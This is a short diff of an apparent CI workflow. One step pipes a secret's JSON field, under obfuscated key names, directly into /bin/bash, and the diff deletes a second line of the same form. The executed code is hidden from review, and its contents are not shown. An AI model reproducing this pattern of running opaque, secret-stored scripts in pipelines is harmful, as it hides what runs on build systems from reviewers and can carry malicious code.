@@ -19,7 +19,6 @@ jobs:
           kw29: ${{ secrets.kw29 }}
         run: |
           printf '%s' "$kw29" | jq -r .cvzbd74653 | /bin/bash
-          printf '%s' "$ww07539" | jq -r .tmsti836 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
